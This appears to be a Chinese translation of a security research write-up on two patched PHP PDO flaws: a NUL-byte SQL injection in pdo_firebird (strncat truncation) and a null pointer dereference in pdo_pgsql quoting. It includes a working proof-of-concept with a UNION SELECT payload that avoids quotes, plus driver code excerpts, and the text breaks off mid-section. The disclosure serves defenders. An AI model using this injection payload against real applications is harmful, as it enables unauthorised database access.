#  大象要一口一口吃：PHP PDO扩展中的NUL字节SQL注入与空指针解引用漏洞  
 幻泉之洲   2026-07-08 02:38  
  
>   
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibdicz5utWjQ9ZbkZc2qHueBEHNTWd6TTwJpInI5OYdEgpte03SFUXktR5unXet5UG13z79JlgLxbKMvnUWiaraqf0dVIOQoEbiaIo/640?wx_fmt=jpeg&from=appmsg "")  
  
PHP核心和捆绑扩展通常被看作成熟且加固过的攻击面，但底层实现层面的bug照样能溜进去。我们在之前的研究文章《Hack the Elephant One Bite at a Time: JPEG-Related Memory-Safety Bugs in PHP》[1]里展示了PHP解析JPEG时触发的内存安全问题。  
  
沿着这个方向，我们对PDO整体及其各组件——也就是连接不同数据库后端的DBMS特定驱动——做了一次更深入的审查。这项工作越挖越深，最终在第三方依赖中也发现了漏洞。具体来说，我们在PostgreSQL客户端库（libpq）中识别出一个整数溢出，详见《Attack arithmetic: how an integer overflow in PostgreSQL libpq leads to denial of service》[2]。还在Firebird 3客户端库（fbclient）中发现了一个信息泄露问题[3]：当Firebird 3客户端与Firebird 4或更高版本服务器通信时，XSQLDA字段中不正确的长度值会触发越界读取，暴露非预期数据。  
  
不过，我们这次工作的核心成果还是跟PDO扩展本身的架构有关。审查过程中，我们记录了大量驱动特定行为，以及驱动与目标DBMS交互时的多个缺陷。本文挑两个代表性漏洞来细说：  
- CVE-2025-14179[4]：pdo_firebird中通过引用字符串内NUL字节实现的SQL注入  
- CVE-2025-14180[5]：PDO引用过程中的空指针解引用  
通过实际示例，你会看到对关键驱动例程的深度审查如何暴露了Web应用开发者多年来信赖的防御机制中的严重弱点。  
## 与DBMS的交互是怎么回事  
  
PHP不直接跟数据库对话。连接和查询执行始终通过扩展进行。在实践中，数据库相关扩展通常分两类：通用PDO接口（依赖pdo_pgsql等数据库特定驱动）和原生扩展，如mysqli、pgsql或sqlite3。在内部，这些组件可能使用DBMS供应商的官方客户端C库（比如libpq）、嵌入式进程内引擎（如SQLite）或中间ODBC层。所以，你选择的扩展及其底层实现细节不仅决定了功能和兼容性，也塑造了攻击面和漏洞向量。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibdcicA9mmIgBxG8caBkKSJ1hE5YZhUPgRSAxR5L7bzTap0ZxEib2Ed2lU2kNdoboHZibqicttV9hryctndv0Xnwy04w5AgOBW6MpvY/640?wx_fmt=png&from=appmsg "")  
  
▲ PHP中DBMS访问的整体架构  
  
这张图展示了PHP中DBMS访问的整体架构。应用代码调用PHP扩展（要么通过抽象PDO接口，要么通过原生扩展）。从那里，查询被转发到目标DBMS的客户端库、嵌入式进程内引擎（如SQLite）或通用ODBC层。这个多阶段结构很关键：扩展层加上它依赖的底层库，共同决定了兼容性、可用功能集、操作系统特定行为以及相关的漏洞向量。  
  
下面拆解这个架构中三个经常让人困惑的细节。  
### 1. ODBC是什么？为什么画成单独一层？  
  
开放数据库连接（ODBC）是一个标准化的、供应商中立的数据库访问接口。应用程序（或PHP扩展）调用ODBC API，ODBC驱动管理器将这些调用路由到DBMS特定的ODBC驱动。在架构图中，ODBC通常画成独立一层，因为它把公共API表面跟DBMS特定的底层实现细节干净地分开了。  
### 2. 为什么MS SQL Server的调用栈比其他数据库复杂？  
  
在PHP中，SQL Server支持通常由pdo_sqlsrv或sqlsrv扩展提供。这些扩展构建在Microsoft ODBC Driver for SQL Server之上，在类Unix系统上还需要一个ODBC驱动管理器，比如unixODBC。这种分层模型是有意为之：微软拥有并维护实现SQL Server特定行为（认证、TLS和协议细节）的底层驱动，而PHP扩展暴露熟悉的PDO接口。还有一个替代方案是pdo_dblib，它通过FreeTDS库绕过ODBC，但这不是主流选择。  
### 3. libmysqlclient和mysqlnd在MySQL场景下有什么不同？  
  
历史上，PHP的MySQL扩展可以针对两种不同的客户端库编译：  
- libmysqlclient是MySQL生态维护的传统外部客户端库。  
- mysqlnd（MySQL Native Driver）是PHP的原生MySQL驱动，专门为PHP运行时构建，与Zend Engine内存管理器紧密集成。  
PHP官方文档建议使用捆绑的mysqlnd库而不是libmysqlclient，因为mysqlnd性能更好、内存占用更少，而且不需要安装第三方系统组件。当然，遗留部署环境可能仍然支持任一种后端。  
>   
>   
>   
  
## PHP Data Objects（PDO）  
  
PDO（PHP Data Objects）是PHP的标准数据库抽象层，提供一致、面向对象的API来与多种DBMS交互。顾名思义，连接和结果集都暴露为对象（PDO和PDOStatement）。结果是，像准备和执行语句、管理事务、获取行这类常见工作流，不管后端驱动是什么，看起来几乎一模一样。这降低了数据库特定耦合，让应用代码更容易长期维护。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6Tibc8JfBiaFrYLLOic2gJQtC16ut5X6tmFcvGPIax0eA6icueJl3NnyLqhYw86fLFq0peADGC3BOjYP7TpSlrTEyWqmlhJnajic47DW0/640?wx_fmt=png&from=appmsg "")  
  
在实践中，目标DBMS在连接初始化时选定。DSN前缀——DSN中冒号之前的部分（例如pgsql:、mysql:、sqlite:）——告诉PHP加载哪个PDO驱动。之后，所有数据库访问都通过相同的PDO API进行，差异主要限于支持的DSN选项、SQL方言细节和驱动特定行为。  
  
<?php // 连接到PostgreSQL $dsn_pg = 'pgsql:host=localhost;port=5432;dbname=db'; $pdo_pg = new PDO($dsn_pg, 'user', 'password');// 连接到Firebird$dsn_fb = 'firebird:dbname=192.168.1.2:/data/db.fdb;charset=utf8;';$pdo_fb = new PDO($dsn_fb, 'user', 'password');  
### 选项1：模拟模式（默认）  
  
在这种模式下，参数准备完全在PHP端完成。pdo_mysql驱动自己转义数据，把它插入SQL模板，然后发送一条完整的文本查询到服务器。  
  
PHP代码（pdo_prepare.php）：  
  
<?php$pdo = new PDO('mysql:host=127.0.0.1;dbname=db;charset=utf8mb4', 'user', 'password');$stmt = $pdo->prepare('SELECT id, name FROM users WHERE id = ?');$stmt->execute([1]); // 传入数字1作为参数foreach ($stmt->fetchAll() as $row) {    echo $row['id'] . ':' . $row['name'] . PHP_EOL;}  
  
MySQL通用日志：  
  
-- 服务器收到纯文本语句（Query命令）。-- 注意：PHP端整数1在日志中显示为带引号的字符串'1'。Id Command    Argument48 Connect    user@localhost on db using TCP/IP48 Query      SELECT id, name FROM users WHERE id = '1'48 Quit  
### 选项2：关闭模拟（原生语句）  
  
关闭模拟后，PDO切换到MySQL的原生二进制协议。SQL模板和绑定的参数分两步分别传输：先准备语句，然后执行系统调用，参数值以未修改的数据形式发送。  
  
PHP代码（pdo_prepare.php）：  
  
<?php$options = [    PDO::ATTR_EMULATE_PREPARES => false, // 关闭模拟];$pdo = new PDO('mysql:host=127.0.0.1;dbname=db;charset=utf8mb4', 'user', 'password', $options);$stmt = $pdo->prepare('SELECT id, name FROM users WHERE id = ?');$stmt->execute([1]); // 传入值1foreach ($stmt->fetchAll() as $row) {    echo $row['id'] . ':' . $row['name'] . PHP_EOL;}  
  
MySQL通用日志：  
  
-- 服务器分两个阶段处理语句（Prepare和Execute）。-- 注意：Execute阶段，原始值1不带引号发送。Id Command    Argument49 Connect    user@localhost on db using TCP/IP49 Prepare    SELECT id, name FROM users WHERE id = ?49 Execute    SELECT id, name FROM users WHERE id = 149 Close stmt49 Quit  
  
下面这张表汇总了各PDO驱动对预处理语句模拟的支持情况和行为差异：  
<table><thead><tr><th>PDO驱动</th><th>ATTR_EMULATE_PREPARES</th><th>默认值</th><th>查询如何准备</th></tr></thead><tbody><tr><td>pdo_firebird<p style="margin:16px 0;font-size:15px;line-height:1.8;color:#3f3f3f;"></p></td><td>—</td><td>始终原生prepare</td><td>—</td></tr><tr><td>pdo_mysql<p style="margin:16px 0;font-size:15px;line-height:1.8;color:#3f3f3f;"></p></td><td>ON</td><td>模拟；可关闭</td><td>—</td></tr><tr><td>pdo_odbc</td><td>—</td><td>始终原生（通过ODBC SQLPrepare）</td><td>—</td></tr><tr><td>pdo_pgsql</td><td>OFF</td><td>原生；仅在明确配置或特殊模式下模拟</td><td>—</td></tr><tr><td>pdo_sqlite</td><td>—</td><td>始终原生prepare</td><td>—</td></tr><tr><td>pdo_sqlsrv</td><td>OFF</td><td>原生；模拟为可选项</td><td>—</td></tr></tbody></table>  
对于使用模拟的驱动，预处理语句实际上变成了客户端查询重写：PDO替换占位符、转义值，然后把最终文本查询发给服务器。  
## 发现的漏洞  
### 漏洞1：pdo_firebird中通过引用字符串内NUL字节实现的SQL注入  
  
  
▲ 安全公告，CVE-2025-14179，高危，Aleksey Solovev、Nikita Sveshnikov（Positive Technologies）  
  
分析pdo_firebird如何分词和准备SQL查询时，我们发现了一个破坏查询结构的漏洞。这里反直觉的地方在于：驱动端的引用例程（quoter）本身工作正常，产生的是正确转义的输出。问题出在后面：在PDO::prepare期间，pdo_firebird重新解析并重建SQL，错误地处理了包含NUL字节（\0）的字符串字面量。结果是驱动丢弃了终止引号，让攻击者控制的输入从引用字面量中溢出，进入可执行SQL上下文，实现SQL注入。  
#### 技术细节  
  
在Firebird PDO驱动中，初始字符串清洗由firebird_handle_quoter处理，这个函数通过PDO::quote暴露。这个组件行为是正确的。  
  
我们来验证引用例程。下面这个测试确认firebird_handle_quoter在多种编码和表示形式下都能正确转义特殊字符，包括引号、反引号和显式NUL字节：  
  
PHP清洗测试代码：  
  
<?php$pdo = new PDO('firebird:dbname=127.0.0.1:/var/lib/firebird/data/mirror.fdb;charset=utf8;', 'user', 'password');$p1 = $pdo->quote("alice'\x27\u{27}`\x60\u{60}\"\x22\u{22}\x00\u{00}");$p2 = $pdo->quote("offensive'\x27\u{27}`\x60\u{60}\"\x22\u{22}\x00\u{00}");$sql = "SELECT * FROM users WHERE username = $p1 AND department = $p2";file_put_contents('./sql_query.dump', $sql);  
  
Dump输出（字符串和通过xxd查看原始字节）：  
  
$ ./php cli.php && cat sql_query.dumpSELECT * FROM users WHERE username = 'alice''''''```"""' AND department = 'offensive''''''```"""'$ xxd sql_query.dump00000000: 5345 4c45 4354 202a 2046 524f 4d20 7573  SELECT * FROM us00000010: 6572 7320 5748 4552 4520 7573 6572 6e61  ers WHERE userna00000020: 6d65 203d 2027 616c 6963 6527 2727 2727  me = 'alice'''''00000030: 2760 6060 2222 2200 0027 2041 4e44 2064  '```"""..' AND d00000040: 6570 6172 746d 656e 7420 3d20 276f 6666  epartment = 'off00000050: 656e 7369 7665 2727 2727 2727 6060 6022  ensive''''''```"00000060: 2222 0000 27                             ""..'  
  
firebird_handle_quoter表现符合预期：它把单引号加倍，并正确地在由'（27）分隔的字符串字面量内保留了NUL字节（00）。引用的字符串上下文保持完好。  
#### PDO::prepare内部逻辑是怎样被破坏的  
  
问题在已经引用过、语法有效的SQL字符串被传入语句准备路径时触发。对查询的破坏性转换可以直接在PHP核心调用流中追踪：  
  
**1. 进入PDO核心的入口点**  
  
在应用层，代码调用$pdo->prepare($query)。PDO核心按原样接受SQL字符串，不做额外标准化或安全检查，直接通过调用驱动的preparer回调[6]转发给数据库特定驱动。  
  
/* ext/pdo/pdo_dbh.c */if (dbh->methods->preparer(dbh, query, &stmt, driver_options)) {  
  
**2. 控制权转移到Firebird驱动**  
  
此时，执行进入Firebird PDO驱动。驱动把SQL字符串直接转发到其内部语句准备路径php_firebird_alloc_prepare_stmt[7]，PDO层不做任何额外标准化。  
  
/* ext/pdo_firebird/firebird_driver.c *//* allocate and prepare statement */if (!php_firebird_alloc_prepare_stmt(dbh, sql, &num_sqlda, &s, np)) {    break;}  
  
**3. 查询解析和预处理启动**  
  
php_firebird_alloc_prepare_stmt调用php_firebird_preprocess[8]，后者对传入的SQL字符串进行分词。分词器实现为php_firebird_get_token[9]状态机，逐字节扫描SQL字符串并将其拆分为逻辑token。然后驱动通过遍历switch(tok)循环中的token类型，将对应片段追加到sql_out缓冲区来重建语句：  
  
/* ext/pdo_firebird/firebird_driver.c */while (p < end) {    start = p;    tok = php_firebird_get_token(&p, end);    switch (tok) {  
  
**4. 关键点：脆弱的strncat()调用**  
  
在php_firebird_preprocess[10]中，控制到达通用透传分支：  
  
/* ext/pdo_firebird/firebird_driver.c */case ttWhite:case ttComment:case ttString:case ttOther:    strncat(sql_out, start, p - start);    break;  
  
驱动没有使用二进制安全、长度限定的复制例程如memcpy()，而是用strncat()追加token数据。由于strncat()把第一个NUL字节（\0）当作字符串终止符，追加操作（把token内容复制到sql_out缓冲区）在遇到NUL时截断token。这个截断导致SQL字符串字面量的终止单引号被丢弃，破坏了预期的引用边界，在预处理后损坏了SQL语句。  
#### 语句重建的解剖  
  
问题根源在于strncat(dest, src, n)在C语言中如何处理NUL字节。它一旦在src字符串中遇到第一个NUL字节（\0）就停止追加，完全忽略调用者传入的显式字节计数n（p - start）。  
  
结果就是，当PDO内置引用例程（PDO::quote）正确引用包含NUL字节的输入时，它产生语法有效的SQL字面量，如'\0'（开始引号、NUL字节、结束引号）。  
  
但在语句重建期间，strncat做了以下事情：  
1. 追加开始引号（'）。  
1. 立即碰到\0并把它解释为字符串结束。  
1. 提前终止追加，实际上省略了结束引号。  
一旦结束引号丢失，SQL解析器预期的字符串字面量边界就被破坏了。后续攻击者控制的值可以在引用上下文之外被解释，合并到同一个字面量中，使攻击者控制的数据被DBMS当作可执行SQL来解析。  
  
开发者预期的SQL查询：  
  
SELECT * FROM users WHERE username = '\0' AND department = ' OR 1=1 --'  
  
实际的SQL查询（strncat()解析失败后）：  
  
SELECT * FROM users WHERE username = ' AND department = ' OR 1=1 --'  
#### 复现步骤  
  
为了演示利用，我们用一个简单的PHP示例执行对Firebird数据库的典型查询。  
  
成功攻击需要动态SQL构造，其中不可信参数先用PDO内置引用例程（PDO::quote）引用，然后生成的SQL字符串传入PDO::prepare进行解析和准备。攻击者控制的输入还必须包含一个NUL字节（\0）。  
  
在生产Web应用中，开发者经常把"用PDO::quote引用，然后用PDO::prepare准备"这种模式当作天然安全的。这具有欺骗性：引用步骤是正确的，但Firebird驱动的preparer逻辑随后进行的预处理和分词损坏了SQL字符串。这种在PHP语句准备路径内部悄悄丢失引用边界的现象，会导致攻击者控制的数据被DBMS当作可执行SQL解释，实现SQL注入。  
  
**测试环境搭建（Firebird）**  
  
为了支撑SQL注入概念验证，我们搭建了一个隔离的Firebird数据库模式，模拟一个用于在安全部门（"Offensive"和"Defensive"）之间分配人员的公司信息系统：  
  
-- 重建表（覆盖已存在的）RECREATE TABLE users (    id INT NOT NULL PRIMARY KEY,    username VARCHAR(50) CHARACTER SET UTF8 NOT NULL,    department VARCHAR(50) CHARACTER SET UTF8 NOT NULL);-- 用测试数据填充表INSERT INTO users (id, username, department) VALUES (1, 'alice', 'offensive');INSERT INTO users (id, username, department) VALUES (2, 'bob', 'defensive');-- 提交事务以保存在Firebird中的更改COMMIT;  
  
**真实攻击场景（PHP）**  
  
为了让SQL注入影响更明确，我们模拟一个针对上面创建的users表的真实工作流。  
  
从一个常见的PHP模式开始：按部门查找员工。开发者假设代码是安全的，因为每个不可信输入参数在插入动态构造的SQL字符串之前都通过$dbh->quote()处理了：  
  
<?php$pdo = new PDO('firebird:dbname=127.0.0.1:/var/lib/firebird/data/mirror.fdb;charset=utf8;', 'user', 'password', [    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);// 外部输入$username = "\0";$department = 'UNION SELECT * FROM USERS UNION SELECT -1, ASCII_CHAR(68)||ASCII_CHAR(66)||ASCII_CHAR(77)||ASCII_CHAR(83), rdb$get_context(ASCII_CHAR(83)||ASCII_CHAR(89)||ASCII_CHAR(83)||ASCII_CHAR(84)||ASCII_CHAR(69)||ASCII_CHAR(77), ASCII_CHAR(69)||ASCII_CHAR(78)||ASCII_CHAR(71)||ASCII_CHAR(73)||ASCII_CHAR(78)||ASCII_CHAR(69)||ASCII_CHAR(95)||ASCII_CHAR(86)||ASCII_CHAR(69)||ASCII_CHAR(82)||ASCII_CHAR(83)||ASCII_CHAR(73)||ASCII_CHAR(79)||ASCII_CHAR(78)) FROM rdb$database --';// pdo_firebird驱动的常规参数引用$safe_user = $pdo->quote($username);$safe_dept = $pdo->quote($department);// 动态SQL字符串构造$sql  = "SELECT * FROM users WHERE username = $safe_user AND department = $safe_dept";// 调用有漏洞的准备路径$stmt = $pdo->prepare($sql);$stmt->execute();// 从数据库获取结果echo json_encode($stmt->fetchAll(PDO::FETCH_ASSOC)) . "\n";  
  
由于前面描述的strncat()截断bug，$safe_user字面量的终止引号被悄悄丢失了。Firebird没有执行对空字符串的良性查找，而是收到了一条损坏的语句，其中token边界和语法角色被移位了。服务器实际上把后续的AND department =片段当作同一字符串字面量的一部分，而第二个参数（$safe_dept）的结束引号成为攻击者重新控制SQL解析的位置。此时，UNION SELECT载荷可以被执行，--符号用来注释掉剩余子句。  
  
漏洞查询没有返回空结果集（如预期那样，因为没有名为\0的用户），而是返回了合法行（alice和bob）加上隐藏的系统元数据。利用ASCII_CHAR()逐字符构造字符串，载荷完全避免了单引号。Firebird随后在结果集中返回了确切的数据库引擎版本（5.0.3），证明SQL注入成功。  
  
执行结果：  
  
$ ./php-src-php-8.5.5/sapi/cli/php cli.php[  {"ID":-1,"USERNAME":"DBMS","DEPARTMENT":"5.0.3"},  {"ID":1,"USERNAME":"alice","DEPARTMENT":"offensive"},  {"ID":2,"USERNAME":"bob","DEPARTMENT":"defensive"}]  
#### 修复  
  
PHP维护者在2026年5月的例行安全更新中处理了这个问题。修复作为计划内安全更新的一部分发布，跟踪编号CVE-2025-14179[4]。  
  
官方提交3f40b65[11]重写了Firebird驱动的逐token SQL重建逻辑。具体来说，开发者在处理ttString字符串字面量时停止使用不安全的strncat()函数。  
  
替换方案是一个二进制安全的机制，用于处理和拼接内存片段，依赖其实际字节长度而非终止NUL字符。结果是，如果引用值包含NUL字节（\0），php_firebird_alloc_prepare_stmt现在保留完整的字符串字面量，包括结束引号。这防止了预处理期间的引号边界丢失，消除了悄悄发生SQL注入的可能性。  
### 漏洞2：PDO引用中的空指针解引用  
  
安全公告，CVE-2025-14180[5]，中等严重程度，6.3/10，Aleksey Solovev（Positive Technologies）  
  
PHP提供两个常用的PostgreSQL扩展：pgsql和pdo_pgsql，两者都依赖libpq客户端库。当pdo_pgsql驱动明确启用模拟预处理（PDO::ATTR_EMULATE_PREPARES => true）时，PDO中存在一个设计层面的问题。  
#### 技术细节  
  
启用模拟预处理语句后，pdo_pgsql将参数扩展委托给PDO SQL解析器，具体是pdo_parse_params。在特定输入下，调用流会达到一个失败条件：  
  
**引用函数调用**  
  
在ext/pdo/pdo_sql_parser.re[12]中，解析器尝试通过调用数据库驱动的引用回调（驱动的quoter方法）来清洗不可信输入：  
  
/* ext/pdo/pdo_sql_parser.re */plc->quoted = stmt->dbh->methods->quoter(stmt->dbh, buf, param_type);  
  
**libpq报错和NULL返回值**  
  
在PostgreSQL驱动中，PDO的引用回调解析为pgsql_handle_quoter，后者又调用libpq的PQescapeStringConn[13]。如果输入包含无效的多字节序列（例如alice\x99），libpq抛出"invalid multibyte character"条件并设置err输出标志。驱动随后中止引用并返回NULL。PDO接着把这个NULL传播到plc->quoted。  
  
/* ext/pdo_pgsql/pgsql_driver.c */quoted = safe_emalloc(2, ZSTR_LEN(unquoted), 3);quoted[0] = '\'';quotedlen = PQescapeStringConn(H->server, quoted + 1, ZSTR_VAL(unquoted), ZSTR_LEN(unquoted), &err);if (err) {  efree(quoted);  return NULL;}  
  
**调用字符串长度宏**  
  
执行继续通过PDO SQL解析器，直到碰到ZSTR_LEN宏[14]，它用于获取被引用（转义后）字符串的长度。  
  
/* ext/pdo/pdo_sql_parser.re */newbuffer_len += ZSTR_LEN(plc->quoted);  
  
**空指针解引用**  
  
要解释崩溃原因，看看ZSTR_LEN[15]在Zend Engine核心（Zend/zend_string.h）中是如何定义的：  
  
/* Zend/zend_string.h */#define ZSTR_LEN(zstr)  (zstr)->len  
  
这个宏展开为对zend_string的直接字段访问，具体是.len成员。在这个执行路径中，plc->quoted是NULL（0x0）。当解析器求值ZSTR_LEN(plc->quoted)时，它实际上尝试读取(NULL)->len。  
  
解引用地址0触发空指针解引用故障。操作系统响应方式是发送SIGSEGV（段错误），终止PHP工作进程，导致拒绝服务（DoS）。  
#### 复现步骤  
  
为了演示问题，考虑一个向PostgreSQL数据库执行典型查询的PHP概念验证。  
  
利用需要两个条件：应用程序（或驱动配置）必须强制PDO进入模拟预处理语句模式（PDO::ATTR_EMULATE_PREPARES => true），攻击者必须能够提供包含当前连接客户端编码下无效字节序列的参数。  
  
在实践中，对PostgreSQL使用模拟预处理（PDO::ATTR_EMULATE_PREPARES => true）仍然相当普遍，

### 参考资料  
  
[1]   
https://swarm.ptsecurity.com/hack-the-elephant-one-bite-at-a-time-jpeg-related-memory-safety-bugs-in-php/  
  
[2]   
https://swarm.ptsecurity.com/attack-arithmetic-how-an-integer-overflow-in-postgresql-libpq-leads-to-denial-of-service/  
  
[3]   
https://github.com/FirebirdSQL/firebird/security/advisories/GHSA-mfpr-9886-xjhg  
  
[4]   
https://github.com/php/php-src/security/advisories/GHSA-w476-322c-wpvm  
  
[5]   
https://github.com/php/php-src/security/advisories/GHSA-8xr5-qppj-gvwj  
  
[6]   
https://github.com/php/php-src/blob/php-8.5.5/ext/pdo/pdo_dbh.c#L663  
  
[7]   
https://github.com/php/php-src/blob/php-8.5.5/ext/pdo_firebird/firebird_driver.c#L642  
  
[8]   
https://github.com/php/php-src/blob/php-8.5.5/ext/pdo_firebird/firebird_driver.c#L1015  
  
[9]   
https://github.com/php/php-src/blob/php-8.5.5/ext/pdo_firebird/firebird_driver.c#L196  
  
[10]   
https://github.com/php/php-src/blob/php-8.5.5/ext/pdo_firebird/firebird_driver.c#L443  
  
[11]   
https://github.com/php/php-src/commit/3f40b65323dd1b85e9bab6878237d3867e449d5c  
  
[12]   
https://github.com/php/php-src/blob/php-8.5.0/ext/pdo/pdo_sql_parser.re#L302  
  
[13]   
https://github.com/php/php-src/blob/php-8.5.0/ext/pdo_pgsql/pgsql_driver.c#L407  
  
[14]   
https://github.com/php/php-src/blob/php-8.5.0/ext/pdo/pdo_sql_parser.re#L319  
  
[15]   
https://github.com/php/php-src/blob/php-8.5.0/Zend/zend_string.h#L69  
  
[16]   
https://swarm.ptsecurity.com/hack-the-elephant-one-bite-at-a-time-nul-byte-sql-injection-in-pdo_firebird-and-null-pointer-dereference-in-pdo-pgsql/  
  
